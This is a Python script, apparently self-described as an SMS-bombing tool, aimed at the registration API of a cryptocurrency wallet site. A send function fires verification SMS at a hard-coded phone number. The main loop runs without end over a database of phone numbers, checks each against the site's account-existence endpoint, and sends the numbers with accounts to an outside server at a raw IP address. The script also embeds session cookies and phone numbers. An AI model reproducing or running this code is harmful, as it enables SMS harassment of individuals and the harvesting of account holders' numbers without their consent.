# coding:utf-8
import requests
# from 短信轰炸.number_mongo import number_six,auto_number
from number_mongo import number_BaFangZiYuan


# 短信轰炸
def send_sms():
    # {"errcode":100,"msg":"Request Successfully","data":[]}
    headers = {'Host': 'bgj.io', 'Connection': 'keep-alive', 'Content-Length': '35', 'Pragma': 'no-cache',
               'Cache-Control': 'no-cache', 'Accept': '*/*', 'Origin': 'https://bgj.io',
               'X-Requested-With': 'XMLHttpRequest',
               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36',
               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
               'Referer': 'https://bgj.io/register.html', 'Accept-Encoding': 'gzip, deflate, br',
               'Accept-Language': 'zh-CN,zh;q=0.9',
               'Cookie': 'aliyungf_tc=AQAAAGxPgB4fhgQAuVARcERNtybwGWGc; hcf_ci_session=71bbol4cudopfcg7a1q174ht9b3liml7; qimo_seosource_458db490-0599-11e8-87ec-25f4c0baf180=%E5%85%B6%E4%BB%96%E7%BD%91%E7%AB%99; qimo_seokeywords_458db490-0599-11e8-87ec-25f4c0baf180=%E6%9C%AA%E7%9F%A5; accessId=458db490-0599-11e8-87ec-25f4c0baf180; bad_id458db490-0599-11e8-87ec-25f4c0baf180=a87bdb01-76a9-11e8-83c7-19af3ac3010e; nice_id458db490-0599-11e8-87ec-25f4c0baf180=a87bdb02-76a9-11e8-83c7-19af3ac3010e; __lnkrntdmcvrd=-1; pageViewNum=6'}
    url = "https://bgj.io/api/service/sendcode"
    form_data = [('account', "18505615375"),
                 ('action', "register"),
                 ]
    page = requests.post(url, headers=headers, data=form_data).text
    print(page)
    return page


def check_number(number):
    headers = {'Host': 'bgj.io', 'Connection': 'keep-alive', 'Content-Length': '19', 'Pragma': 'no-cache',
               'Cache-Control': 'no-cache', 'Accept': '*/*', 'Origin': 'https://bgj.io',
               'X-Requested-With': 'XMLHttpRequest',
               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36',
               'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
               'Referer': 'https://bgj.io/register.html', 'Accept-Encoding': 'gzip, deflate, br',
               'Accept-Language': 'zh-CN,zh;q=0.9',
               'Cookie': 'aliyungf_tc=AQAAAGxPgB4fhgQAuVARcERNtybwGWGc; hcf_ci_session=71bbol4cudopfcg7a1q174ht9b3liml7; qimo_seosource_458db490-0599-11e8-87ec-25f4c0baf180=%E5%85%B6%E4%BB%96%E7%BD%91%E7%AB%99; qimo_seokeywords_458db490-0599-11e8-87ec-25f4c0baf180=%E6%9C%AA%E7%9F%A5; accessId=458db490-0599-11e8-87ec-25f4c0baf180; bad_id458db490-0599-11e8-87ec-25f4c0baf180=a87bdb01-76a9-11e8-83c7-19af3ac3010e; nice_id458db490-0599-11e8-87ec-25f4c0baf180=a87bdb02-76a9-11e8-83c7-19af3ac3010e; __lnkrntdmcvrd=-1; pageViewNum=6'}
    url = "https://bgj.io/api/verify/check_account/"
    form_data = [('account', str(number)),
                 ]
    page = requests.post(url, headers=headers, data=form_data).text
    print(page)
    return page


def save_success_number(number):
    with open("success_币管家.txt", "a+")as f:
        f.write(str(number) + "\n")


def save_faile_number(number):
    with open("faile_币管家.txt", "a+")as f:
        f.write(str(number) + "\n")


def save(number):
    url ="http://122.114.183.102:8080/saveNumber/{0}/".format(number,)
    print(requests.get(url).text)


if __name__ == "__main__":

    count = 0
    while True:
        try:
            with open("flag_币管家.txt")as f:
                count = int(f.read())
            for res in number_BaFangZiYuan.find({'_id': count}):
                line = res["number"].replace("\n", "")
                print(line, count)
                count += 1
                result = check_number(line)
                if str(result).find("账号已存在") != -1:
                    save_success_number(number=line)
                    save(number=line)
                else:
                    save_faile_number(number=line)
            with open("flag_币管家.txt", "w")as f:
                f.write(str(count))
        except:
            pass
# {"errcode":100,"msg":"Account can be used.","data":[]}
# {"errcode":80,"msg":"Request Failure","data":["账号已存在"]}

"""

15017603831 55441
"""
